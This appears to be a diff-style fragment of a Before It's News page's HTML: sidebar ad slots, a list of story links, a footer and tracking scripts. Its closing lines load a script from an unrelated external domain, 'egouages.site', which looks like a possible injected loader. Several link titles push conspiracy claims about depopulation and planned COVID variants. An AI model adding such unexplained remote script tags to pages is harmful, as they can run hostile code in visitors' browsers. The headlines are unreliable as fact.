+<div class="sidebar_item" id="sbAdItem_4">
+<div class="rotating_text_link" id="rotating_text_link_8"></div>
+<style>
+    #M310742ScriptRootC720413 {
+        min-height: 300px;
+    }
+</style>
+<div id="M310742ScriptRootC720413"></div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.720413.js"></script>
+<div class="rotating_text_link" id="rotating_text_link_9"></div>
+</div>
+<div id="top_alternative">
+<div class="title">Top Alternative</div>
+<div class="content">
+<div class="link"><a class="title" href="/alternative/2023/03/brenden-oconnell-180-mike-gill-donald-trump-saves-the-day-biden-ukraine-the-new-hampshire-cartel-mar-5-2023-3789620.html" target="_self">Brenden O'Connell: 180. Mike Gill, Donald Trump Saves The Day...Biden, Ukraine, The New Hampshire Cartel Mar 5, 2023</a></div><div class="link"><a class="title" href="/survival/2023/03/taiwan-warns-china-could-carry-out-a-sudden-entry-into-country-2788125.html" target="_self">Taiwan Warns China Could Carry Out A “Sudden Entry” Into Country</a></div><div class="link"><a class="title" href="/religion/2023/03/abortion-activists-smash-windows-at-minnesota-pregnancy-clinic-that-provides-free-diapers-2568196.html" target="_self">Abortion activists smash windows at Minnesota pregnancy clinic that provides free diapers</a></div><div class="link"><a class="title" href="/strange/2023/03/women-are-being-eliminated-to-depopulate-the-planet-2480744.html" target="_self">Women are Being Eliminated to Depopulate the Planet</a></div><div class="link"><a class="title" href="/alternative/2023/03/mike-lindell-destroying-democracy-tide-has-turned-no-vax-no-mask-3-3789618.html" target="_self">Mike Lindell Destroying Democracy - Tide Has Turned - NO VAX NO MASK</a></div><div class="link"><a class="title" href="/politics/2023/03/america-are-you-ready-for-mass-blackouts-3285119.html" target="_self">America - Are You Ready For Mass Blackouts?.. As Biden's Attack On America Continues </a></div><div class="link"><a class="title" href="/alternative/2023/03/trump-nails-it-at-cpac-declass-incoming-march-madness-3789608.html" target="_self">Trump Nails It At CPAC - Declass Incoming - March Madness</a></div><div class="link"><a class="title" href="/beyond-science/2023/03/most-famous-sinkholes-around-the-world-2455025.html" target="_self">Most Famous Sinkholes Around the World</a></div><div class="link"><a class="title" href="/survival/2023/03/project-fear-when-to-release-a-new-covid-variant-2788122.html" target="_self">“Project Fear”: When to Release A New COVID “Variant”</a></div><div class="link"><a class="title" href="/economy/2023/03/bidens-great-economic-recovery-narrative-is-built-on-deception-brandon-smith-must-read-3080053.html" target="_self">Biden’s “Great Economic Recovery” Narrative Is Built On Deception - Brandon Smith Must Read</a></div> </div>
+</div>
+<div class="sidebar_item" id="sbAdItem_5">
+<div class="rotating_text_link" id="rotating_text_link_10"></div>
+<div class="rotating_text_link" id="rotating_text_link_12"></div> <div class="rotating_text_link" id="rotating_text_link_11"></div>
+</div>
+</div>
+</div>
+
+
+<div class="clear"></div>
+<div style="visibility: hidden;"><p><a href="/notyet/signup-v3.html" id="lightbox" name="lightbox">SignUp</a></p></div>
+<div style="visibility: hidden;"><p><a href="/notyet/login-v3.html" id="lightbox_login" name="lightbox_login">Login</a></p></div>
+<script src="/static/js-v3/tabs-bin-rev-202302041.js" type="text/javascript"></script>
+<script src="https://code.jquery.com/ui/1.13.1/jquery-ui.min.js"></script>
+<script src="/static/js-v3/story-bin-rev-202302041.js" type="text/javascript"></script>
+<div class="clear"></div>
+<div class="logo-bottom"></div>
+<div id="footer">
+<a href="/v3/about/">About</a> | <a href="/v3/advertise/">Advertise With Us</a> | <a href="/v3/faq/">FAQ</a> | <a href="/v3/contact/">Contact</a>
+| <a href="/v3/privacy/">Privacy</a> | <a href="/v3/terms/">Terms of Service</a>
+| <a href="/v3/copyright/">Copyright Notification</a> | <a href="/v3/subscribe/">RSS Subscribe</a> | <a href="/v3/widgets/">Widgets</a><br/><br/>
+Portions copyright © 2023 NSearch Technology, Inc., All Rights Reserved.<br/>Before It's News® is a registered Service Mark of NSearch Technology,
+Inc..<br/>
+</div>
+
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+    }
+</script>
+<div style="visibility: hidden;"><p><a href="/contribute/newsletter/subscribe.html" id="lightbox_newsletter" name="lightbox_newsletter">Newsletter</a></p></div>
+<div style="visibility:hidden;"><a href="/bottom_send_mail/email.php" id="lightbox_email_send" title="Email this story">Email this story</a></div>
+<div style="visibility:hidden;"><a href="/bottom_float/email.html" id="lightbox_email" title="Email this story">Email this story</a></div>
+<div style="display: block">
+<div class="tooltipContent" id="likeContributorMessage"></div>
+<div class="tooltipContent" id="likeStoryMessage"></div>
+<div class="tooltipContent" id="authorMessage"></div>
+<div class="tooltipContent" id="subscribenewsletterMessage"></div>
+</div>
+<div style="display:none; clear: both">
+<div id="ban_reason">
+<p id="ban_reason_message">If you really want to ban this commenter, please write down the reason:</p>
+<textarea cols="200" id="ban_reason_content" rows="25" style="height: 200px; width: 550px"></textarea>
+</div>
+<div id="bin_alert"></div>
+<div id="turn_off_float_story">
+If you really want to disable all recommended stories, click on OK button. After that, you will be redirect to your options page.
+</div>
+</div>
+<script src="/static/js-v3/jsDeferParsing-bin-rev-202302041.js" type="text/javascript"></script>
+<noscript><iframe height="0" src="https://www.googletagmanager.com/ns.html?id=GTM-5D8XJ6Q" style="display:none;visibility:hidden" width="0"></iframe></noscript>
+<script async="" defer="" src="//egouages.site/easylist/12098" type="text/javascript"></script>
+
+
+</img>
